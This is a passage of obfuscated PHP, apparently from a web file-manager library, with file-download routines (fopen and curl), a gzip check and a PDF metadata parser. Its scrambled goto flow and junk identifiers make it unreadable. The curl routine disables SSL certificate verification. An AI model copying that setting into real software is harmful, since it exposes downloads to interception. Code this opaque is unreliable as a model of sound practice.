$d≤‡âï’•Ü . $Fﬁ•±“–ëÖ[1422]; goto cïÌÎ´ŸèÌ; eƒñÌääóß: } static function fileDownloadFopen($aêËÜÁ∑ëπ, $a§π™ç“å∆, $DÊ∑ﬁ“ÉèÃ = 0) { $eóã©éº¨ª =& $_SERVER[£¿ÌÙëü¡¯¯]; @ini_set($eóã©éº¨ª[1426], $eóã©éº¨ª[1427]); $cÁÇÏæçç„ = $a§π™ç“å∆ . $eóã©éº¨ª[1423]; set_timeout(); @unlink($cÁÇÏæçç„); if ($bß‡µÂÕÊ≈ = @fopen($aêËÜÁ∑ëπ, $eóã©éº¨ª[1428])) { goto a¡ã⁄≈´•Œ; C∏ß—≈å˘é: fclose($bß‡µÂÕÊ≈); $dñôº€ûäÉ = filesize(iconv_system($cÁÇÏæçç„)); if ($DÊ∑ﬁ“ÉèÃ != 0 && $dñôº€ûäÉ != $DÊ∑ﬁ“ÉèÃ) { return array($eóã©éº¨ª[1007] => !1, $eóã©éº¨ª[1009] => $eóã©éº¨ª[1432]); } goto dºæÒ÷€Œã; a¡ã⁄≈´•Œ: if (!($FÆ©ÜåÏö = @fopen($cÁÇÏæçç„, $eóã©éº¨ª[1429]))) { return array($eóã©éº¨ª[1007] => !1, $eóã©éº¨ª[1009] => $eóã©éº¨ª[1430]); } while (!feof($bß‡µÂÕÊ≈)) { if (!file_exists($cÁÇÏæçç„)) { fclose($FÆ©ÜåÏö); return array($eóã©éº¨ª[1007] => !1, $eóã©éº¨ª[1009] => $eóã©éº¨ª[1431]); } clearstatcache(); if ($DÊ∑ﬁ“ÉèÃ > 0 && $DÊ∑ﬁ“ÉèÃ == filesize(iconv_system($cÁÇÏæçç„))) { break; } fwrite($FÆ©ÜåÏö, fread($bß‡µÂÕÊ≈, 1024 * 8), 1024 * 8); } fclose($FÆ©ÜåÏö); goto C∏ß—≈å˘é; dºæÒ÷€Œã: self::checkGzip($cÁÇÏæçç„); if (!@rename($cÁÇÏæçç„, $a§π™ç“å∆)) { usleep(round(rand(0, 1000) * 50)); @unlink($a§π™ç“å∆); $e≤÷¬Ù•Æ≥ = @rename($cÁÇÏæçç„, $a§π™ç“å∆); if (!$e≤÷¬Ù•Æ≥) { return array($eóã©éº¨ª[1007] => !1, $eóã©éº¨ª[1009] => $eóã©éº¨ª[1433]); } } return array($eóã©éº¨ª[1007] => !0, $eóã©éº¨ª[1009] => $eóã©éº¨ª[683]); goto cëØ¢Ìùã„; cëØ¢Ìùã„: } else { return array($eóã©éº¨ª[1007] => !1, $eóã©éº¨ª[1009] => $eóã©éº¨ª[1434]); } } static function fileDownloadCurl($eúÖ≥–®¬Ã, $eæ◊¨√‹ÿÇ, $DΩÓâÏîí≤ = false, $eéÍ≠æå¶« = 0, $a®÷È»âä« = 0) { goto c⁄≤ìÛˆÑ«; eëÏ∑≤∂£ò: curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_SSL_VERIFYHOST, 0); goto c—öïô Û∆; c—öïô Û∆: curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_NOPROGRESS, !1); curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_PROGRESSFUNCTION, $EÏ÷ﬁØ∫Úï[1196]); curl_progress_start($Eàﬂ›ıâÌÈ); goto BÙ¯ê∑æ…¥; BÙ¯ê∑æ…¥: curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_USERAGENT, $EÏ÷ﬁØ∫Úï[1427]); $F¯—È≥ëÇÏ = curl_exec($Eàﬂ›ıâÌÈ); curl_progress_end($Eàﬂ›ıâÌÈ); goto c”ÔäŒèÚÙ; eâøíˆÛ’Á: if ($fù–óﬂıÍÇ < $a®÷È»âä« && $a®÷È»âä« != 0) { return array($EÏ÷ﬁØ∫Úï[1007] => !1, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[1424]); } if ($fù–óﬂıÍÇ > $a®÷È»âä« && $a®÷È»âä« != 0) { return array($EÏ÷ﬁØ∫Úï[1007] => !1, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[1432]); } if ($F¯—È≥ëÇÏ && filesize($eìÛ˘ú§ê‹) != 0) { self::checkGzip($eìÛ˘ú§ê‹); if (!@rename($eìÛ˘ú§ê‹, $eæ◊¨√‹ÿÇ)) { @unlink($eæ◊¨√‹ÿÇ); $F¯—È≥ëÇÏ = @rename($eìÛ˘ú§ê‹, $eæ◊¨√‹ÿÇ); if (!$F¯—È≥ëÇÏ) { return array($EÏ÷ﬁØ∫Úï[1007] => !1, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[1436]); } } return array($EÏ÷ﬁØ∫Úï[1007] => !0, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[683]); } goto f∫íã€∏Ï; c⁄≤ìÛˆÑ«: $EÏ÷ﬁØ∫Úï =& $_SERVER[£¿ÌÙëü¡¯¯]; $eìÛ˘ú§ê‹ = $eæ◊¨√‹ÿÇ . $EÏ÷ﬁØ∫Úï[1423]; set_timeout(); goto BÌÔ‰ò∞œÚ; BÌÔ‰ò∞œÚ: $B¢ﬁπ·™÷ò = @fopen($eìÛ˘ú§ê‹, $EÏ÷ﬁØ∫Úï[707]); if (!$B¢ﬁπ·™÷ò) { return array($EÏ÷ﬁØ∫Úï[1007] => !1, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[1435]); } $Eàﬂ›ıâÌÈ = curl_init($eúÖ≥–®¬Ã); goto E≥õ∏ùºû§; E≥õ∏ùºû§: if ($DΩÓâÏîí≤) { curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_RANGE, $eéÍ≠æå¶« . $EÏ÷ﬁØ∫Úï[700]); } curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_FILE, $B¢ﬁπ·™÷ò); curl_setopt($Eàﬂ›ıâÌÈ, CURLOPT_REFERER, get_url_link($eúÖ≥–®¬Ã)); goto eëÏ∑≤∂£ò; f∫íã€∏Ï: return array($EÏ÷ﬁØ∫Úï[1007] => !1, $EÏ÷ﬁØ∫Úï[1009] => $EÏ÷ﬁØ∫Úï[1437]); goto eÖÜÙúø‡´; c”ÔäŒèÚÙ: curl_close($Eàﬂ›ıâÌÈ); fclose($B¢ﬁπ·™÷ò); $fù–óﬂıÍÇ = filesize(iconv_system($eìÛ˘ú§ê‹)); goto eâøíˆÛ’Á; eÖÜÙúø‡´: } static function checkGzip($C◊ÇÜ„≠Ç†) { goto B≤ûÍÿ˘ßŸ; e…¨Ë®¨‡Ê: file_put_contents($C◊ÇÜ„≠Ç†, $f∑¯ΩΩÍ°); goto EÆˆ¶ûûÒ; eòä÷çï◊°: ob_start(); readgzfile($C◊ÇÜ„≠Ç†); $f∑¯ΩΩÍ° = ob_get_clean(); goto e…¨Ë®¨‡Ê; B≤ûÍÿ˘ßŸ: $CÆ§¡◊”¶é = $_SERVER[£¿ÌÙëü¡¯¯][1438]; $aëîÑìü∫ñ = file_sub_str($C◊ÇÜ„≠Ç†, 0, 2); if ($CÆ§¡◊”¶é != $aëîÑìü∫ñ) { return; } goto eòä÷çï◊°; EÆˆ¶ûûÒ: } } class FileParsePdf { public static function parse($Dóª∏¯î®Ç) { goto C†√Ö•Û¨ë; cÚÓ‰ü—·À: $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1440]] = StreamWrapperIO::read($Dóª∏¯î®Ç, 0, $f«õ˜Ò´‘«); $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1441]] = StreamWrapperIO::read($Dóª∏¯î®Ç, $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[78]] - $f«õ˜Ò´‘«, $f«õ˜Ò´‘«); $Cä±Ø“ú¢€ = self::decodeXref($D∞òëÎÇÓ‹); goto A®ÜÊ§®â; A®ÜÊ§®â: if ($Cä±Ø“ú¢€) { $Fé†ãëÏ ü = $Cä±Ø“ú¢€[$bŒÌ∏≤√‰¶[1442]][$bŒÌ∏≤√‰¶[1159]]; $FËàô‹ì§Í = self::getObjectValue($D∞òëÎÇÓ‹, $Cä±Ø“ú¢€, $Fé†ãëÏ ü); } $FËàô‹ì§Í = is_array($FËàô‹ì§Í) ? $FËàô‹ì§Í : array(); $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1443]] = 0; goto Få†È£âÔÍ; A—ôîÛÖòé: preg_match($dÊ–ÖÛ∑é”, $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1441]], $A∆âÔÖï“≈); if (!$FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1443]] && count($A∆âÔÖï“≈) == 5) { $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1443]] = $A∆âÔÖï“≈[3]; $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1445]] = $A∆âÔÖï“≈[4]; } preg_match($bŒÌ∏≤√‰¶[1446], $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1440]], $A∆âÔÖï“≈); goto f◊ªï∞´∞ç; f◊ªï∞´∞ç: if ($A∆âÔÖï“≈) { $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1247]] = $A∆âÔÖï“≈[1]; } $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1447]] = 0; $dÊ–ÖÛ∑é” = $bŒÌ∏≤√‰¶[1448]; goto Aı˘ÿñ≤ôõ; BΩ—ÃÙÚ∫ç: if ($A∆âÔÖï“≈[1] && $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1447]] < $A∆âÔÖï“≈[1][0]) { $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1447]] = $A∆âÔÖï“≈[1][0]; } $FËàô‹ì§Í = self::parseInfoItem($FËàô‹ì§Í); return $FËàô‹ì§Í; goto e´î á√Èù; Aı˘ÿñ≤ôõ: preg_match_all($dÊ–ÖÛ∑é”, $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1440]], $A∆âÔÖï“≈); if ($A∆âÔÖï“≈[1] && $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1447]] < $A∆âÔÖï“≈[1][0]) { $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1447]] = $A∆âÔÖï“≈[1][0]; } preg_match_all($dÊ–ÖÛ∑é”, $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1441]], $A∆âÔÖï“≈); goto BΩ—ÃÙÚ∫ç; Få†È£âÔÍ: $dÊ–ÖÛ∑é” = $bŒÌ∏≤√‰¶[1444]; preg_match($dÊ–ÖÛ∑é”, $D∞òëÎÇÓ‹[$bŒÌ∏≤√‰¶[1440]], $A∆âÔÖï“≈); if (!$FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1443]] && count($A∆âÔÖï“≈) == 5) { $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1443]] = $A∆âÔÖï“≈[3]; $FËàô‹ì§Í[$bŒÌ∏≤√‰¶[1445]] = $A∆âÔÖï“≈[4]; } goto A—ôîÛÖòé; C†√Ö•Û¨ë: $bŒÌ∏≤√‰¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f«õ˜Ò´‘« = 32 * 1024; $D∞òëÎÇÓ‹ = array($bŒÌ∏≤√‰¶[771] => fopen($Dóª∏¯î®Ç, $bŒÌ∏≤√‰¶[1136]), $bŒÌ∏≤√‰¶[76] => $Dóª∏¯î®Ç, $bŒÌ∏≤√‰¶[78] => filesize($Dóª∏¯î®Ç), $bŒÌ∏≤√‰¶[1439] => $f«õ˜Ò´‘«); goto cÚÓ‰ü—·À; e´î á√Èù: } private static function parseInfoItem($DÀäà¶Øéì) { $E°Ù∞ÿÈÀ≈ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$DÀäà¶Øéì) { return !1; } $FÙ∑Í”¢∫ç = array($E°Ù∞ÿÈÀ≈[1248] => array($E°Ù∞ÿÈÀ≈[1449], $E°Ù∞ÿÈÀ≈[33]), $E°Ù∞ÿÈÀ≈[1450] => array($E°Ù∞ÿÈÀ≈[1451], $E°Ù∞ÿÈÀ≈[33]), $E°Ù∞ÿÈÀ≈[184] => array($E°Ù∞ÿÈÀ≈[1452], $E°Ù∞ÿÈÀ≈[207]), $E°Ù∞ÿÈÀ≈[108] => array($E°Ù∞ÿÈÀ≈[1453], $E°Ù∞ÿÈÀ≈[207]), $E°Ù∞ÿÈÀ≈[1447] => array($E°Ù∞ÿÈÀ≈[1447], $E°Ù∞ÿÈÀ≈[273]), $E°Ù∞ÿÈÀ≈[1443] => array($E°Ù∞ÿÈÀ≈[1443], $E°Ù∞ÿÈÀ≈[273]), $E°Ù∞ÿÈÀ≈[1445] => array($E°Ù∞ÿÈÀ≈[1445], $E°Ù∞ÿÈÀ≈[273]), $E°Ù∞ÿÈÀ≈[1454] => array($E°Ù∞ÿÈÀ≈[1455], $E°Ù∞ÿÈÀ≈[33]), $E°Ù∞ÿÈÀ≈[1456] => array($E°Ù∞ÿÈÀ≈[1457], $E°Ù∞ÿÈÀ≈[33]), $E°Ù∞ÿÈÀ≈[1458] => array($E°Ù∞ÿÈÀ≈[1247], $E°Ù∞ÿÈÀ≈[33])); $e“îÍÑå±ﬁ = array(); foreach ($FÙ∑Í”¢∫ç as $F÷„Õ÷ãåˆ => $d’∏Â˘°Àµ) { if (!isset($DÀäà¶Øéì[$d’∏Â˘°Àµ[0]])) { continue; } $a·éåå⁄…Ü = $DÀäà¶Øéì[$d’∏Â˘°Àµ[0]]; if (!$a·éåå⁄…Ü || is_array($a·éåå⁄…Ü)) { continue; } switch ($d’∏Â˘°Àµ[1]) { case $E°Ù∞ÿÈÀ≈[273]: $a·éåå⁄…Ü = intval($a·éåå⁄…Ü); break; case $E°Ù∞ÿÈÀ≈[207]: if (substr($a·éåå⁄…Ü, 0, 2) == $E°Ù∞ÿÈÀ≈[1459]) { $a·éåå⁄…Ü = substr($a·éåå⁄…Ü, 2, 14); } if (strtotime($a·éåå⁄…Ü)) { $a·éåå⁄…Ü = date($E°Ù∞ÿÈÀ≈[1460], strtotime($a·éåå⁄…Ü)); } break; } $e“îÍÑå±ﬁ[$F÷„Õ÷ãåˆ] = $a·éåå⁄…Ü; } return $e“îÍÑå±ﬁ; } private static function decodeXref(&$c∏ö⁄ÑÆÛÖ) { goto D›≈è¯£π£; D›≈è¯£π£: $D‹“çµÿäõ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BË« √àò∫ = $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1441]]; $AÌ·ê‘æø‡ = array($D‹“çµÿäõ[1442] => array(), $D‹“çµÿäõ[1461] => array()); goto a¬ÎÌŸπ¢»; Aç˘®Áıû‚: if ($c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[78]] - $aª∫ô—Ê£Â > $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1439]]) { $fﬁ¶ãïúÆÜ = 4 * $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1439]]; $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1439]] = $fﬁ¶ãïúÆÜ; $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1440]] = StreamWrapperIO::read($c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[76]], 0, $fﬁ¶ãïúÆÜ); $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1441]] = StreamWrapperIO::read($c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[76]], $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[78]] - $fﬁ¶ãïúÆÜ, $fﬁ¶ãïúÆÜ); $BË« √àò∫ = $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1441]]; } $EƒııãÉ‘è = 0; preg_match_all($D‹“çµÿäõ[1463], $BË« √àò∫, $AÙàå•ˆ∆À); goto eÂÏ‡é‹ïö; Dó∏‰≠¶Çá: if (preg_match($D‹“çµÿäõ[1473], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[1159]] = intval($AÙàå•ˆ∆À[1]) . $D‹“çµÿäõ[71] . intval($AÙàå•ˆ∆À[2]); } if (preg_match($D‹“çµÿäõ[1474], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[364]] = array(); $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[364]][0] = $AÙàå•ˆ∆À[1]; $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[364]][1] = $AÙàå•ˆ∆À[2]; } if (!$AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[1159]]) { return !1; } goto Fäÿâí∏á€; Fäÿâí∏á€: if (preg_match($D‹“çµÿäõ[1475], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { } return $AÌ·ê‘æø‡; goto f¡Ì‚ô©˜; C≤¨É¨Ç£Ñ: if (preg_match($D‹“çµÿäõ[1468], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[78]] = intval($AÙàå•ˆ∆À[1]); } if (preg_match($D‹“çµÿäõ[1469], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[1470]] = intval($AÙàå•ˆ∆À[1]) . $D‹“çµÿäõ[71] . intval($AÙàå•ˆ∆À[2]); } if (preg_match($D‹“çµÿäõ[1471], $f›∫äœØæŒ, $AÙàå•ˆ∆À) > 0) { $AÌ·ê‘æø‡[$D‹“çµÿäõ[1442]][$D‹“çµÿäõ[1472]] = intval($AÙàå•ˆ∆À[1]) . $D‹“çµÿäõ[71] . intval($AÙàå•ˆ∆À[2]); } goto Dó∏‰≠¶Çá; a¬ÎÌŸπ¢»: $cû’ºÓ—Ì· = $D‹“çµÿäõ[1462]; if (!preg_match_all($cû’ºÓ—Ì·, $BË« √àò∫, $AÙàå•ˆ∆À, PREG_SET_ORDER, 0)) { return !1; } $aª∫ô—Ê£Â = intval($AÙàå•ˆ∆À[0][1]); goto Aç˘®Áıû‚; eÂÏ‡é‹ïö: foreach ($AÙàå•ˆ∆À[3] as $a⁄≈èáíåõ => $a§«ˆŒﬁÜ°) { if ($AÙàå•ˆ∆À[3][$a⁄≈èáíåõ] == $D‹“çµÿäõ[1464]) { $E†ÉÛ¡µ≥å = $EƒııãÉ‘è . $D‹“çµÿäõ[71] . intval($AÙàå•ˆ∆À[2][$a⁄≈èáíåõ]); $AÌ·ê‘æø‡[$D‹“çµÿäõ[1461]][$E†ÉÛ¡µ≥å] = intval($AÙàå•ˆ∆À[1][$a⁄≈èáíåõ]); ++$EƒııãÉ‘è; } else { if ($AÙàå•ˆ∆À[3][$a⁄≈èáíåõ] == $D‹“çµÿäõ[1465]) { ++$EƒııãÉ‘è; } else { } } } if (preg_match_all($D‹“çµÿäõ[1466], $BË« √àò∫, $AÙàå•ˆ∆À)) { $C•à‰Ï«æˆ = $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[78]] - $c∏ö⁄ÑÆÛÖ[$D‹“çµÿäõ[1439]]; foreach ($AÙàå•ˆ∆À[0] as $a⁄≈èáíåõ => $eﬂÒäÈñ¡Ï) { $d¨û¢˘ÂÑê = $AÙàå•ˆ∆À[1][$a⁄≈èáíåõ] . $D‹“çµÿäõ[71] . $AÙàå•ˆ∆À[2][$a⁄≈èáíåõ]; $AÌ·ê‘æø‡[$D‹“çµÿäõ[1461]][$d¨û¢˘ÂÑê] = strpos($BË« √àò∫, $eﬂÒäÈñ¡Ï) + $C•à‰Ï«æˆ + 1; } } if (preg_match_all($D‹“çµÿäõ[1467], $BË« √àò∫, $AÙàå•ˆ∆À)) { $f›∫äœØæŒ = count($AÙàå•ˆ∆À[1]) == 1 ? $AÙàå•ˆ∆À[1][0] : $AÙàå•ˆ∆À[1][1]; } else { $f›∫äœØæŒ = substr($BË« √àò∫, -1024 * 5); } goto C≤¨É¨Ç£Ñ; f¡Ì‚ô©˜: } private static function getObjectValue($aÜ¶ÿùë, $eÕ‡ê»áÑä, $bµï∞ÜüÈ¯) { goto Dô±ÆŒ∏≤Â; d∑„Ø≠∆¡Ë: if (!is_array($F ÀÇé†ã”[1])) { return array(); } $a©◊‡·ÆÙÉ = array(); for ($BÖí™âÑØ∑ = 0; $BÖí™âÑØ∑ < count($F ÀÇé†ã”[1]); $BÖí™âÑØ∑ += 2) { $e∂Êº§öæÈ = $F ÀÇé†ã”[1][$BÖí™âÑØ∑]; $f´Ñ∂ÕàåŸ = $F ÀÇé†ã”[1][$BÖí™âÑØ∑ + 1]; if (count($e∂Êº§öæÈ) == 3 && $e∂Êº§öæÈ[0] == $Fû–ÓŒ ﬂí[8]) { $D…„ß¬‚≥ã = !1; if ($f´Ñ∂ÕàåŸ[0] == $Fû–ÓŒ ﬂí[1476]) { $f´Ñ∂ÕàåŸ = self::getObject($aÜ¶ÿùë, $eÕ‡ê»áÑä[$Fû–ÓŒ ﬂí[1461]][$f´Ñ∂ÕàåŸ[1]]); } $D…„ß¬‚≥ã = $f´Ñ∂ÕàåŸ[1]; if ($D…„ß¬‚≥ã === !1) { continue; } if (is_string($D…„ß¬‚≥ã)) { $D…„ß¬‚≥ã = self::decodeStr($D…„ß¬‚≥ã); } $a©◊‡·ÆÙÉ[$e∂Êº§öæÈ[1]] = $D…„ß¬‚≥ã; } } goto eÈ©òÊ∑¬Ω; Dô±ÆŒ∏≤Â: $Fû–ÓŒ ﬂí =& $_SERVER[£¿ÌÙëü¡¯¯]; $F ÀÇé†ã” = self::getObject($aÜ¶ÿùë, $eÕ‡ê»áÑä[$Fû–ÓŒ ﬂí[1461]][$bµï∞ÜüÈ¯]); if (is_string($F ÀÇé†ã”[1])) { return $F ÀÇé†ã”[1]; } goto d∑„Ø≠∆¡Ë; eÈ©òÊ∑¬Ω: return $a©◊‡·ÆÙÉ; goto eÑúõ±Õ´…; eÑúõ±Õ´…: } private static function getObject($b∂º†ë√…â, $f¥„ÊÖ«©) { $bùõ®”è¨ﬁ = self::getObjectItem($b∂º†ë√…â, $f¥„ÊÖ«©); $bùõ®”è¨ﬁ = self::getObjectItem($b∂º†ë√…â, $bùõ®”è¨ﬁ[2]); return $bùõ®”è¨ﬁ; } private static function getObjectItem($F÷¢á¿ó¬ı, $dÖå⁄´≠ÿì) { goto C∆ƒÃπ∞åª; d¡Èñ˘ºó‰: $aﬁü‰‚∞¢Û = self::getRawObject($D∫ï„œâè´, $böˆÕ∞äËß); if ($dÖå⁄´≠ÿì >= $FŸÇÆ—ÉΩŒ) { $aﬁü‰‚∞¢Û[2] = $aﬁü‰‚∞¢Û[2] + $FŸÇÆ—ÉΩŒ; } else { if ($dÖå⁄´≠ÿì > $bÍÒó◊õÀÕ && $dÖå⁄´≠ÿì <= $FŸÇÆ—ÉΩŒ) { $aﬁü‰‚∞¢Û[2] = $aﬁü‰‚∞¢Û[2] + $dÖå⁄´≠ÿì; } } return $aﬁü‰‚∞¢Û; goto Fù¢«Ò‘ë√; cüÓëË©∑“: $böˆÕ∞äËß = $dÖå⁄´≠ÿì >= $FŸÇÆ—ÉΩŒ ? $dÖå⁄´≠ÿì - $FŸÇÆ—ÉΩŒ : $dÖå⁄´≠ÿì; $D∫ï„œâè´ = $dÖå⁄´≠ÿì >= $FŸÇÆ—ÉΩŒ ? $F÷¢á¿ó¬ı[$A‚·ÖÆ˘‡≠[1441]] : $F÷¢á¿ó¬ı[$A‚·ÖÆ˘‡≠[1440]]; if ($dÖå⁄´≠ÿì > $bÍÒó◊õÀÕ && $dÖå⁄´≠ÿì <= $FŸÇÆ—ÉΩŒ) { $böˆÕ∞äËß = 0; $D∫ï„œâè´ = StreamWrapperIO::read($F÷¢á¿ó¬ı[$A‚·ÖÆ˘‡≠[76]], $dÖå⁄´≠ÿì, $bÍÒó◊õÀÕ); } goto d¡Èñ˘ºó‰; C∆ƒÃπ∞åª: $A‚·ÖÆ˘‡≠ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÍÒó◊õÀÕ = $F÷¢á¿ó¬ı[$A‚·ÖÆ˘‡≠[1439]]; $FŸÇÆ—ÉΩŒ = $F÷¢á¿ó¬ı[$A‚·ÖÆ˘‡≠[78]] - $bÍÒó◊õÀÕ; goto cüÓëË©∑“; Fù¢«Ò‘ë√: } private static function decodeStr($f”⁄í÷Éèå) { goto c—⁄Ù◊Ÿêë; EœåÖøûöè: return $f”⁄í÷Éèå; goto dÖÖò∫âÆ≤; c—⁄Ù◊Ÿêë: $B∆‡Ü¡åóÙ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f”⁄í÷Éèå = str_replace(array($B∆‡Ü¡åóÙ[1477], $B∆‡Ü¡åóÙ[1478], $B∆‡Ü¡åóÙ[1479], $B∆‡Ü¡åóÙ[1480], $B∆‡Ü¡åóÙ[1481], $B∆‡Ü¡åóÙ[1482], $B∆‡Ü¡åóÙ[1483], $B∆‡Ü¡åóÙ[1484]), array($B∆‡Ü¡åóÙ[96], $B∆‡Ü¡åóÙ[50], $B∆‡Ü¡åóÙ[8], $B∆‡Ü¡åóÙ[245], $B∆‡Ü¡åóÙ[814], $B∆‡Ü¡åóÙ[214], $B∆‡Ü¡åóÙ[716], $B∆‡Ü¡åóÙ[327]), $f”⁄í÷Éèå); $B§ö≈™ÉÊÃ = preg_split($B∆‡Ü¡åóÙ[1485], $f”⁄í÷Éèå, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bŸàçîÊ˘è; fÓÎüÜ∞â»: $f”⁄í÷Éèå = $B∆‡Ü¡åóÙ[33]; foreach ($B§ö≈™ÉÊÃ as $fÎƒ¶Ì…À∆) { if (preg_match($B∆‡Ü¡åóÙ[1488], $fÎƒ¶Ì…À∆)) { $f”⁄í÷Éèå .= \chr(hexdec(trim($fÎƒ¶Ì…À∆, $B∆‡Ü¡åóÙ[1489]))); } else { $f”⁄í÷Éèå .= $fÎƒ¶Ì…À∆; } } $B§ö≈™ÉÊÃ = preg_split($B∆‡Ü¡åóÙ[1490], $f”⁄í÷Éèå, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eŒ˘ç⁄Æê√; eŒ˘ç⁄Æê√: $f”⁄í÷Éèå = $B∆‡Ü¡åóÙ[33]; foreach ($B§ö≈™ÉÊÃ as $fÎƒ¶Ì…À∆) { if (preg_match($B∆‡Ü¡åóÙ[1491], $fÎƒ¶Ì…À∆) && !1 === stripos($fÎƒ¶Ì…À∆, $B∆‡Ü¡åóÙ[1492])) { $fÎƒ¶Ì…À∆ = preg_replace($B∆‡Ü¡åóÙ[1493], $B∆‡Ü¡åóÙ[33], $fÎƒ¶Ì…À∆); $fÎƒ¶Ì…À∆ = trim($fÎƒ¶Ì…À∆, $B∆‡Ü¡åóÙ[924]); $fÎƒ¶Ì…À∆ = pack($B∆‡Ü¡åóÙ[1494], $fÎƒ¶Ì…À∆); $f”⁄í÷Éèå .= $fÎƒ¶Ì…À∆; } else { $f”⁄í÷Éèå .= $fÎƒ¶Ì…À∆; } } if (preg_match($B∆‡Ü¡åóÙ[1495], $f”⁄í÷Éèå)) { $FÕ€÷£ì‚˜ = substr($f”⁄í÷Éèå, 2); $f”⁄í÷Éèå = $B∆‡Ü¡åóÙ[33]; $EÎèÏºê∏≈ = strlen($FÕ€÷£ì‚˜); for ($b•î·å≥è• = 0; $b•î·å≥è• < $EÎèÏºê∏≈; $b•î·å≥è• += 2) { $dáÀ≠º∞“ª = hexdec(bin2hex(substr($FÕ€÷£ì‚˜, $b•î·å≥è•, 2))); $f”⁄í÷Éèå .= mb_convert_encoding($B∆‡Ü¡åóÙ[1496] . intval($dáÀ≠º∞“ª) . $B∆‡Ü¡åóÙ[68], $B∆‡Ü¡åóÙ[1497], $B∆‡Ü¡åóÙ[1498]); } } goto EœåÖøûöè; bŸàçîÊ˘è: $f”⁄í÷Éèå = $B∆‡Ü¡åóÙ[33]; foreach ($B§ö≈™ÉÊÃ as $fÎƒ¶Ì…À∆) { if (preg_match($B∆‡Ü¡åóÙ[1486], $fÎƒ¶Ì…À∆)) { $f”⁄í÷Éèå .= \chr(octdec(trim($fÎƒ¶Ì…À∆, $B∆‡Ü¡åóÙ[96]))); } else { $f”⁄í÷Éèå .= $fÎƒ¶Ì…À∆; } } $B§ö≈™ÉÊÃ = preg_split($B∆‡Ü¡åóÙ[1487], $f”⁄í÷Éèå, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fÓÎüÜ∞â»; dÖÖò∫âÆ≤: } private static function getRawObject($cß§ë¨¿ÖÌ, $Cπ≈É¶Ú¯É = 0) { goto D≈∞éΩﬂæô; cÛØ∆ì·ºê: return array($c‘°¥õŸç‡, $BıßõÔÔ´Í, $Cπ≈É¶Ú¯É); goto A§¡«ﬂÿ∑ø; DêÑ¶´¯…µ: $Cπ≈É¶Ú¯É += strspn($cß§ë¨¿ÖÌ, $aˆ⁄µé“éº[1499], $Cπ≈É¶Ú¯É); $dÖ®µß®⁄≠ = $cß§ë¨¿ÖÌ[$Cπ≈É¶Ú¯É]; switch ($dÖ®µß®⁄≠) { case 